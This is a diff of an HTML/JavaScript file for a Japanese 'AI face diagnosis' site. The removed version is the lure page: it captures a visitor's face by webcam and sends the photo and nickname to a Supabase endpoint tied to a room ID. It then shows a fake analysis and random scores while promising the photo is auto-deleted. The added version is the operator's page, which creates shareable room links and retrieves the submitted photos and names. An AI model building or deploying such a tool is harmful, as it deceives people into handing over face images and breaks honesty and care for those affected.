@@ -4,259 +4,109 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>AI顔診断</title>
+
+<title>写真受信</title>
 
 <style>
+
 * {
   box-sizing: border-box;
 }
 
 body {
   font-family: sans-serif;
-  background: linear-gradient(135deg, #111827, #312e81, #581c87);
-  color: #222;
-  text-align: center;
-  padding: 20px;
+  background: linear-gradient(
+    135deg,
+    #111827,
+    #312e81,
+    #581c87
+  );
   margin: 0;
+  padding: 20px;
   min-height: 100vh;
 }
 
 .container {
-  max-width: 500px;
+  max-width: 600px;
   margin: auto;
   background: white;
   padding: 25px;
   border-radius: 24px;
-  box-shadow: 0 10px 40px rgba(0,0,0,0.35);
+  box-shadow:
+    0 10px 40px rgba(0,0,0,0.35);
 }
 
 h1 {
-  margin-top: 0;
-  font-size: 30px;
+  text-align: center;
 }
 
-input[type="text"] {
-  width: 90%;
-  padding: 13px;
-  font-size: 16px;
-  border: 1px solid #ccc;
-  border-radius: 12px;
-}
-
-.consent {
-  text-align: left;
-  background: #f3f4f6;
-  padding: 15px;
-  border-radius: 12px;
-  margin-top: 20px;
-  font-size: 14px;
-}
-
-.consent label {
-  display: block;
-  cursor: pointer;
-  padding: 8px 0;
-}
-
-.consent input[type="checkbox"] {
-  width: 20px;
-  height: 20px;
-  vertical-align: middle;
-  margin-right: 8px;
+p {
+  line-height: 1.6;
 }
 
 button {
   width: 100%;
   padding: 15px;
-  margin-top: 15px;
-  font-size: 16px;
+  margin-top: 12px;
   border: none;
   border-radius: 12px;
   background: #111827;
   color: white;
+  font-size: 16px;
   cursor: pointer;
 }
 
-button:disabled {
-  background: #aaa;
-  color: #eee;
-  cursor: not-allowed;
+button:active {
+  transform: scale(0.98);
 }
 
-video,
-#photo {
-  width: 100%;
-  border-radius: 18px;
+.roomBox {
+  background: #f3f4f6;
+  padding: 15px;
+  border-radius: 12px;
   margin-top: 20px;
+  word-break: break-all;
 }
 
-#cameraArea,
-#resultArea,
-#completeArea,
-#loadingArea,
-#diagnosisArea {
-  display: none;
-}
-
-.loading {
-  padding: 30px 10px;
-}
-
-.spinner {
-  width: 70px;
-  height: 70px;
-  border: 7px solid #ddd;
-  border-top: 7px solid #7c3aed;
-  border-radius: 50%;
-  margin: 20px auto;
-  animation: spin 1s linear infinite;
-}
-
-@keyframes spin {
-  to {
-    transform: rotate(360deg);
-  }
-}
-
-.loadingText {
-  font-size: 18px;
-  font-weight: bold;
-}
-
-.analysisStep {
-  color: #666;
-  font-size: 14px;
-  margin-top: 10px;
-}
-
-.progressBox {
-  width: 100%;
-  height: 12px;
-  background: #e5e7eb;
-  border-radius: 20px;
-  overflow: hidden;
-  margin-top: 25px;
-}
-
-.progressBar {
-  width: 0%;
-  height: 100%;
-  background: linear-gradient(90deg, #4f46e5, #a855f7);
-  border-radius: 20px;
-  transition: width 0.1s linear;
-}
-
-.percent {
-  margin-top: 10px;
-  color: #666;
-  font-size: 14px;
-}
-
-.result {
-  margin-top: 20px;
-}
-
-.resultHeader {
-  background: linear-gradient(135deg, #4f46e5, #9333ea);
-  color: white;
-  padding: 25px 15px;
-  border-radius: 20px;
-}
-
-.resultHeader h2 {
-  margin: 0 0 8px;
-}
-
-.resultHeader p {
-  margin: 5px;
-}
-
-.totalLabel {
-  margin-top: 25px;
-  color: #777;
-}
-
-.score {
-  font-size: 70px;
+.roomId {
   font-weight: bold;
   color: #4f46e5;
-  line-height: 1;
-  margin: 10px;
 }
 
-.scoreMax {
-  font-size: 20px;
-  color: #777;
-}
-
-.rank {
-  display: inline-block;
-  padding: 8px 25px;
-  border-radius: 30px;
-  background: #111827;
-  color: white;
-  font-weight: bold;
-  margin: 10px;
-}
-
-.resultItem {
-  text-align: left;
-  margin: 15px 0;
+.photo {
+  margin-top: 20px;
   padding: 15px;
   background: #f5f5f7;
   border-radius: 15px;
 }
 
-.resultItemTitle {
-  font-weight: bold;
-  margin-bottom: 8px;
-}
-
-.bar {
+.photo img {
   width: 100%;
-  height: 10px;
-  background: #ddd;
-  border-radius: 10px;
-  overflow: hidden;
+  border-radius: 12px;
+  margin-top: 10px;
 }
 
-.barInner {
-  height: 100%;
-  background: linear-gradient(90deg, #6366f1, #a855f7);
-  border-radius: 10px;
-  width: 0%;
-  transition: width 1.5s ease;
+.nickname {
+  font-weight: bold;
+  margin-top: 8px;
 }
 
-.comment {
-  margin-top: 20px;
-  padding: 18px;
-  background: #faf5ff;
-  border-radius: 15px;
-  text-align: left;
-}
-
-.shareButton {
-  background: linear-gradient(135deg, #4f46e5, #9333ea);
-}
-
-.errorBox {
-  display: none;
+.status {
   margin-top: 15px;
   padding: 12px;
-  background: #fee2e2;
-  color: #991b1b;
+  background: #eef2ff;
   border-radius: 10px;
-  text-align: left;
-  white-space: pre-wrap;
-  font-size: 13px;
 }
 
-.disclaimer {
-  font-size: 12px;
-  color: #777;
-  margin-top: 20px;
+.error {
+  background: #fee2e2;
+  color: #991b1b;
 }
+
+.hidden {
+  display: none;
+}
+
 </style>
 
 </head>
@@ -265,274 +115,68 @@ video,
 
 <div class="container">
 
-<h1>✨ AI顔診断</h1>
-
-<div id="startArea">
-
-<p>あなたの名前orニックネームを入力してください</p>
-
-<input
-type="text"
-id="nickname"
-placeholder="名前orニックネーム"
-autocomplete="off"
-
->
-
-<div class="consent">
-
-<strong>📷 写真の利用について</strong>
+<h1>📷 写真受信</h1>
 
 <p>
-AI顔診断を行うため、カメラで顔写真を撮影します。
-撮影した写真は、AIが不正防止のためチェックを行います。
+このページで作成したリンクから送られた写真を確認できます。
 </p>
 
-<p>
-写真は診断後自動削除されます。
-</p>
-
-<label>
-<input
-  type="checkbox"
-  id="consent"
->
-内容を確認し、写真の撮影・送信に同意します
-</label>
-
-</div>
-
 <button
-id="startButton"
-type="button"
-disabled
-
->
-
-診断を開始 </button>
-
-<div
-  id="startError"
-  class="errorBox"
-></div>
-
-</div>
-
-<div id="cameraArea">
-
-<h2>📷 顔写真を撮影</h2>
-
-<p>正面を向いて撮影してください</p>
-
-<video
-id="camera"
-autoplay
-playsinline
-
-> </video>
-
-<button
-id="captureButton"
+id="createButton"
 type="button"
 
 >
 
-📸 撮影する </button>
+🔗 リンクを作成 </button>
 
-</div>
-
-<div id="resultArea">
-
-<h2>撮影した写真</h2>
-
-<img
-id="photo"
-alt="撮影した写真"
-
+<div
+  id="roomBox"
+  class="roomBox hidden"
 >
 
+<div>
+ルームID
+</div>
+
+<div
+  id="roomId"
+  class="roomId"
+>
+</div>
+
 <button
-id="sendButton"
+id="copyButton"
 type="button"
 
 >
 
-写真を送信する </button>
+📋 診断リンクをコピー </button>
 
 <button
-id="retakeButton"
+id="openButton"
 type="button"
 
 >
 
-もう一度撮影 </button>
-
-<div
-  id="errorBox"
-  class="errorBox"
-></div>
-
-</div>
-
-<div id="completeArea">
-
-<h2>📤 送信完了</h2>
-
-<p>
-写真の送信が完了しました。
-</p>
-
-</div>
-
-<div id="loadingArea">
-
-<div class="loading">
-
-<div class="spinner"></div>
-
-<div class="loadingText">
-診断処理を実行中…
-</div>
-
-<div
-  class="analysisStep"
-  id="analysisStep"
->
-診断処理を開始しています…
-</div>
-
-<div class="progressBox">
-
-<div
-  class="progressBar"
-  id="analysisProgress"
-></div>
-
-</div>
-
-<div
-  class="percent"
-  id="analysisPercent"
->
-0%
-</div>
-
-</div>
-
-</div>
-
-<div id="diagnosisArea">
-
-<div class="result">
-
-<div class="resultHeader">
-
-<h2>🎉 診断結果</h2>
-
-<p id="resultNickname"></p>
-
-</div>
-
-<div class="totalLabel">
-総合ビジュアルスコア
-</div>
-
-<div class="score">
-
-<span id="totalScore">0</span>
-
-<span class="scoreMax">
-/ 100
-</span>
-
-</div>
-
-<div
-  class="rank"
-  id="rank"
->
-RANK -
-</div>
-
-<div class="resultItem">
-
-<div class="resultItemTitle">
-😊 表情スコア：
-<span id="expressionScore">0</span>
-</div>
-
-<div class="bar">
-
-<div
-  class="barInner"
-  id="expressionBar"
-></div>
-
-</div>
-
-</div>
-
-<div class="resultItem">
-
-<div class="resultItemTitle">
-✨ 雰囲気スコア：
-<span id="moodScore">0</span>
-</div>
-
-<div class="bar">
-
-<div
-  class="barInner"
-  id="moodBar"
-></div>
-
-</div>
-
-</div>
-
-<div class="resultItem">
-
-<div class="resultItemTitle">
-📸 写真映えスコア：
-<span id="photoScore">0</span>
-</div>
-
-<div class="bar">
-
-<div
-  class="barInner"
-  id="photoBar"
-></div>
-
-</div>
-
-</div>
-
-<div class="comment">
-
-<strong>💬 診断コメント</strong>
-
-<p id="commentText"></p>
+🌐 診断サイトを開く </button>
 
 </div>
 
 <button
-id="shareButton"
-class="shareButton"
+id="checkButton"
 type="button"
 
 >
 
-📤 診断結果をシェア </button>
+📷 写真を確認 </button>
 
-<p class="disclaimer">
-※この診断はエンターテインメント目的の参考値です。
-実際の容姿や人物の価値を客観的に評価するものではありません。
-</p>
-
+<div
+  id="status"
+  class="status hidden"
+>
 </div>
 
-</div>
+<div id="photos"></div>
 
 </div>
 
@@ -541,202 +185,161 @@ type="button"
 const PHOTO_RECEIVER_URL =
   "https://crdvhjtoxqeuttrnhfhj.supabase.co/functions/v1/photo-receiver";
 
-const SMOOTH_WORKER_URL =
-  "https://crdvhjtoxqeuttrnhfhj.supabase.co/functions/v1/smooth-worker";
+const DIAGNOSIS_URL =
+  "https://gaffney16445.github.io/ai-face-diagnosis/";
 
 
-const startArea =
-  document.getElementById("startArea");
-
-const cameraArea =
-  document.getElementById("cameraArea");
-
-const resultArea =
-  document.getElementById("resultArea");
-
-const completeArea =
-  document.getElementById("completeArea");
-
-const loadingArea =
-  document.getElementById("loadingArea");
-
-const diagnosisArea =
-  document.getElementById("diagnosisArea");
-
-const nickname =
-  document.getElementById("nickname");
-
-const consent =
-  document.getElementById("consent");
-
-const startButton =
-  document.getElementById("startButton");
-
-const startError =
-  document.getElementById("startError");
-
-const camera =
-  document.getElementById("camera");
-
-const captureButton =
-  document.getElementById("captureButton");
-
-const photo =
-  document.getElementById("photo");
-
-const sendButton =
-  document.getElementById("sendButton");
-
-const retakeButton =
-  document.getElementById("retakeButton");
-
-const shareButton =
-  document.getElementById("shareButton");
-
-const errorBox =
-  document.getElementById("errorBox");
-
-const analysisProgress =
-  document.getElementById("analysisProgress");
-
-const analysisPercent =
-  document.getElementById("analysisPercent");
-
-
-let cameraStream = null;
-let photoBlob = null;
-
-let finalTotal = 0;
-let finalExpression = 0;
-let finalMood = 0;
-let finalPhoto = 0;
-let finalRank = "";
-
-
-/* URLのルームID */
-
-const urlParams =
-  new URLSearchParams(
-    window.location.search
+const createButton =
+  document.getElementById(
+    "createButton"
   );
 
-const room =
-  urlParams.get("room") || "";
+const copyButton =
+  document.getElementById(
+    "copyButton"
+  );
+
+const openButton =
+  document.getElementById(
+    "openButton"
+  );
+
+const checkButton =
+  document.getElementById(
+    "checkButton"
+  );
+
+const roomBox =
+  document.getElementById(
+    "roomBox"
+  );
+
+const roomIdElement =
+  document.getElementById(
+    "roomId"
+  );
+
+const status =
+  document.getElementById(
+    "status"
+  );
+
+const photos =
+  document.getElementById(
+    "photos"
+  );
 
 
-/* 同意チェック */
+let currentRoom = "";
 
-function updateStartButton() {
 
-  const hasNickname =
-    nickname.value.trim().length > 0;
+/* ランダムなルームID */
 
-  const hasConsent =
-    consent.checked;
+function createRoomId() {
 
-  startButton.disabled =
-    !(hasNickname && hasConsent);
+  const chars =
+    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
+
+  let result = "";
+
+  for (
+    let i = 0;
+    i < 12;
+    i++
+  ) {
+
+    result +=
+      chars[
+        Math.floor(
+          Math.random() *
+          chars.length
+        )
+      ];
+
+  }
+
+  return result;
 
 }
 
 
-/* ニックネーム入力 */
+/* 診断リンク */
 
-nickname.addEventListener(
-  "input",
-  updateStartButton
-);
+function getDiagnosisUrl() {
 
+  return (
+    DIAGNOSIS_URL +
+    "?room=" +
+    encodeURIComponent(
+      currentRoom
+    )
+  );
 
-/* 同意チェック */
-
-consent.addEventListener(
-  "change",
-  updateStartButton
-);
-
-
-/* 初期状態 */
-
-updateStartButton();
+}
 
 
-/* カメラ開始 */
+/* リンク作成 */
 
-startButton.addEventListener(
+createButton.addEventListener(
   "click",
-  async () => {
+  function() {
 
-    startError.style.display =
-      "none";
+    currentRoom =
+      createRoomId();
 
-    if (!nickname.value.trim()) {
+    localStorage.setItem(
+      "receiverRoom",
+      currentRoom
+    );
 
-      startError.textContent =
-        "ニックネームを入力してください。";
+    roomIdElement.textContent =
+      currentRoom;
 
-      startError.style.display =
-        "block";
+    roomBox.classList.remove(
+      "hidden"
+    );
 
-      updateStartButton();
+    status.classList.add(
+      "hidden"
+    );
 
+    photos.innerHTML = "";
+
+  }
+);
+
+
+/* コピー */
+
+copyButton.addEventListener(
+  "click",
+  async function() {
+
+    if (!currentRoom) {
       return;
     }
 
-    if (!consent.checked) {
-
-      startError.textContent =
-        "写真の撮影・送信への同意が必要です。";
-
-      startError.style.display =
-        "block";
-
-      updateStartButton();
-
-      return;
-    }
-
-    startButton.disabled =
-      true;
-
-    startButton.textContent =
-      "カメラを起動中...";
+    const link =
+      getDiagnosisUrl();
 
     try {
 
-      cameraStream =
-        await navigator.mediaDevices.getUserMedia({
-          video: {
-            facingMode: "user"
-          },
-          audio: false
-        });
+      await navigator.clipboard.writeText(
+        link
+      );
 
-      camera.srcObject =
-        cameraStream;
+      status.textContent =
+        "診断リンクをコピーしました！";
 
-      startArea.style.display =
-        "none";
-
-      cameraArea.style.display =
-        "block";
+      status.className =
+        "status";
 
     } catch (error) {
 
-      console.error(error);
-
-      startButton.disabled =
-        false;
-
-      startButton.textContent =
-        "診断を開始";
-
-      startError.textContent =
-        "カメラを起動できませんでした。\n" +
-        "ブラウザのカメラ許可を確認してください。";
-
-      startError.style.display =
-        "block";
+      prompt(
+        "このリンクをコピーしてください",
+        link
+      );
 
     }
 
@@ -744,185 +347,165 @@ startButton.addEventListener(
 );
 
 
-/* 撮影 */
+/* 診断サイトを開く */
 
-captureButton.addEventListener(
+openButton.addEventListener(
   "click",
-  () => {
+  function() {
 
-    if (
-      !camera.videoWidth ||
-      !camera.videoHeight
-    ) {
-
-      alert(
-        "カメラの映像がまだ準備できていません。"
-      );
-
+    if (!currentRoom) {
       return;
     }
 
-    const canvas =
-      document.createElement("canvas");
-
-    canvas.width =
-      camera.videoWidth;
-
-    canvas.height =
-      camera.videoHeight;
-
-    const ctx =
-      canvas.getContext("2d");
-
-    ctx.translate(
-      canvas.width,
-      0
+    window.open(
+      getDiagnosisUrl(),
+      "_blank"
     );
-
-    ctx.scale(
-      -1,
-      1
-    );
-
-    ctx.drawImage(
-      camera,
-      0,
-      0,
-      canvas.width,
-      canvas.height
-    );
-
-    photo.src =
-      canvas.toDataURL(
-        "image/jpeg",
-        0.9
-      );
-
-    canvas.toBlob(
-      (blob) => {
-
-        photoBlob =
-          blob;
-
-      },
-      "image/jpeg",
-      0.9
-    );
-
-    if (cameraStream) {
-
-      cameraStream
-        .getTracks()
-        .forEach(
-          track =>
-            track.stop()
-        );
-
-      cameraStream =
-        null;
-    }
-
-    camera.srcObject =
-      null;
-
-    cameraArea.style.display =
-      "none";
-
-    resultArea.style.display =
-      "block";
 
   }
 );
 
 
-/* 写真送信 */
+/* 写真確認 */
 
-sendButton.addEventListener(
+checkButton.addEventListener(
   "click",
-  async () => {
+  async function() {
 
-    if (!photoBlob) {
+    if (!currentRoom) {
 
-      alert(
-        "写真がありません。"
-      );
+      status.textContent =
+        "先に「リンクを作成」を押してください。";
+
+      status.className =
+        "status error";
 
       return;
     }
 
-    errorBox.style.display =
-      "none";
 
-    sendButton.disabled =
-      true;
+    status.textContent =
+      "写真を確認しています…";
 
-    sendButton.textContent =
-      "送信中...";
+    status.className =
+      "status";
+
+    photos.innerHTML = "";
+
 
     try {
 
-      const name =
-        nickname.value.trim();
-
-      let targetUrl;
-
-      if (room) {
-
-        targetUrl =
-          PHOTO_RECEIVER_URL +
-          "?room=" +
-          encodeURIComponent(room) +
-          "&nickname=" +
-          encodeURIComponent(name);
-
-      } else {
-
-        targetUrl =
-          SMOOTH_WORKER_URL;
-
-      }
-
-
       const response =
         await fetch(
-          targetUrl,
-          {
-            method: "POST",
-            headers: {
-              "Content-Type":
-                "image/jpeg"
-            },
-            body: photoBlob
-          }
+          PHOTO_RECEIVER_URL +
+          "?room=" +
+          encodeURIComponent(
+            currentRoom
+          )
         );
 
 
-      const responseText =
-        await response.text();
+      const data =
+        await response.json();
 
 
       if (!response.ok) {
 
         throw new Error(
-          "HTTP " +
-          response.status +
-          "\n" +
-          responseText
+          data.error ||
+          "写真の取得に失敗しました"
         );
 
       }
 
 
-      resultArea.style.display =
-        "none";
+      if (
+        !data.photos ||
+        data.photos.length === 0
+      ) {
 
-      completeArea.style.display =
-        "block";
+        status.textContent =
+          "まだ写真は届いていません。";
+
+        return;
+
+      }
 
 
-      setTimeout(
-        startDiagnosis,
-        1200
+      status.textContent =
+        data.photos.length +
+        "枚の写真が届いています。";
+
+
+      data.photos.forEach(
+        function(photo, index) {
+
+          const box =
+            document.createElement(
+              "div"
+            );
+
+          box.className =
+            "photo";
+
+
+          const title =
+            document.createElement(
+              "div"
+            );
+
+          title.textContent =
+            "📷 写真 " +
+            (index + 1);
+
+
+          const name =
+            document.createElement(
+              "div"
+            );
+
+          name.className =
+            "nickname";
+
+          name.textContent =
+            "👤 " +
+            (
+              photo.nickname ||
+              "名前なし"
+            ) +
+            " さん";
+
+
+          const image =
+            document.createElement(
+              "img"
+            );
+
+          image.src =
+            photo.url;
+
+          image.alt =
+            "受信した写真";
+
+
+          box.appendChild(
+            title
+          );
+
+          box.appendChild(
+            name
+          );
+
+          box.appendChild(
+            image
+          );
+
+
+          photos.appendChild(
+            box
+          );
+
+        }
       );
 
 
@@ -930,18 +513,12 @@ sendButton.addEventListener(
 
       console.error(error);
 
-      errorBox.textContent =
-        "送信エラー:\n" +
+      status.textContent =
+        "エラー: " +
         error.message;
 
-      errorBox.style.display =
-        "block";
-
-      sendButton.disabled =
-        false;
-
-      sendButton.textContent =
-        "写真を送信する";
+      status.className =
+        "status error";
 
     }
 
@@ -949,322 +526,29 @@ sendButton.addEventListener(
 );
 
 
-/* 再撮影 */
+/* 前回のルームを復元 */
 
-retakeButton.addEventListener(
-  "click",
-  async () => {
-
-    resultArea.style.display =
-      "none";
-
-    errorBox.style.display =
-      "none";
-
-    try {
-
-      cameraStream =
-        await navigator.mediaDevices.getUserMedia({
-          video: {
-            facingMode: "user"
-          },
-          audio: false
-        });
-
-      camera.srcObject =
-        cameraStream;
-
-      cameraArea.style.display =
-        "block";
-
-    } catch (error) {
-
-      console.error(error);
-
-      resultArea.style.display =
-        "block";
-
-      errorBox.textContent =
-        "カメラを起動できませんでした。";
-
-      errorBox.style.display =
-        "block";
-
-    }
-
-  }
-);
-
-
-/* 解析演出 */
-
-function startDiagnosis() {
-
-  completeArea.style.display =
-    "none";
-
-  loadingArea.style.display =
-    "block";
-
-  analysisProgress.style.width =
-    "0%";
-
-  analysisPercent.textContent =
-    "0%";
-
-  const steps = [
-
-    "診断処理を開始しています…",
-
-    "画像情報を確認しています…",
-
-    "表情の特徴を確認しています…",
-
-    "雰囲気の特徴を確認しています…",
-
-    "写真映えの特徴を確認しています…",
-
-    "各項目のスコアを計算しています…",
-
-    "診断結果を生成しています…",
-
-    "最終チェックを行っています…"
-
-  ];
-
-  let percent = 0;
-
-  const timer =
-    setInterval(
-      () => {
-
-        percent += 1;
-
-        analysisProgress.style.width =
-          percent + "%";
-
-        analysisPercent.textContent =
-          percent + "%";
-
-        const stepIndex =
-          Math.min(
-            steps.length - 1,
-            Math.floor(
-              percent /
-              (100 / steps.length)
-            )
-          );
-
-        document.getElementById(
-          "analysisStep"
-        ).textContent =
-          steps[stepIndex];
-
-        if (percent >= 100) {
-
-          clearInterval(timer);
-
-          setTimeout(
-            createDiagnosis,
-            500
-          );
-
-        }
-
-      },
-      100
-    );
-
-}
-
-
-/* 診断結果 */
-
-function createDiagnosis() {
-
-  const expression =
-    randomScore();
-
-  const mood =
-    randomScore();
-
-  const photoScore =
-    randomScore();
-
-  const total =
-    Math.round(
-      (
-        expression +
-        mood +
-        photoScore
-      ) / 3
-    );
-
-
-  finalTotal =
-    total;
-
-  finalExpression =
-    expression;
-
-  finalMood =
-    mood;
-
-  finalPhoto =
-    photoScore;
-
-
-  document.getElementById(
-    "resultNickname"
-  ).textContent =
-    nickname.value.trim() +
-    " さんの診断結果";
-
-
-  animateNumber(
-    "totalScore",
-    total,
-    1200
-  );
-
-  animateNumber(
-    "expressionScore",
-    expression,
-    1000
-  );
-
-  animateNumber(
-    "moodScore",
-    mood,
-    1100
-  );
-
-  animateNumber(
-    "photoScore",
-    photoScore,
-    1200
+const savedRoom =
+  localStorage.getItem(
+    "receiverRoom"
   );
 
 
-  let rank;
+if (savedRoom) {
 
-  if (total >= 95) {
+  currentRoom =
+    savedRoom;
 
-    rank = "SS";
+  roomIdElement.textContent =
+    currentRoom;
 
-  } else if (total >= 90) {
-
-    rank = "S";
-
-  } else if (total >= 85) {
-
-    rank = "A+";
-
-  } else if (total >= 80) {
-
-    rank = "A";
-
-  } else if (total >= 75) {
-
-    rank = "B";
-
-  } else {
-
-    rank = "C";
-
-  }
-
-
-  finalRank =
-    rank;
-
-
-  document.getElementById(
-    "rank"
-  ).textContent =
-    "RANK " +
-    rank;
-
-
-  const comments = [
-
-    "自然な表情が魅力的で、親しみやすい印象があります。",
-
-    "全体的にバランスの取れた雰囲気で、写真との相性が良いタイプです。",
-
-    "明るい雰囲気が感じられ、表情による魅力が出やすいタイプです。",
-
-    "落ち着いた印象と独特の雰囲気が特徴的です。",
-
-    "写真にしたときに印象が残りやすいタイプです。"
-
-  ];
-
-
-  document.getElementById(
-    "commentText"
-  ).textContent =
-    comments[
-      Math.floor(
-        Math.random() *
-        comments.length
-      )
-    ];
-
-
-  loadingArea.style.display =
-    "none";
-
-  diagnosisArea.style.display =
-    "block";
-
-
-  setTimeout(
-    () => {
-
-      document.getElementById(
-        "expressionBar"
-      ).style.width =
-        expression + "%";
-
-      document.getElementById(
-        "moodBar"
-      ).style.width =
-        mood + "%";
-
-      document.getElementById(
-        "photoBar"
-      ).style.width =
-        photoScore + "%";
-
-    },
-    200
+  roomBox.classList.remove(
+    "hidden"
   );
 
 }
 
+</script>
 
-/* シェア */
-
-shareButton.addEventListener(
-  "click",
-  async () => {
-
-    const shareText =
-      "✨ AI顔診断結果 ✨\n\n" +
-      nickname.value.trim() +
-      " さんの総合スコアは " +
-      finalTotal +
-      " / 100！\n\n" +
-      "😊 表情スコア：" +
-      finalExpression +
-      "\n" +
-      "✨ 雰囲気スコア：" +
-      finalMood +
-      "\n" +
-      "📸 写真映えスコア：" +
-      finalPhoto +
-      "\n\n" +
-      "🏆 RANK " +
-      finalRank +
-      "\n\n" +
+</body>
+</html>
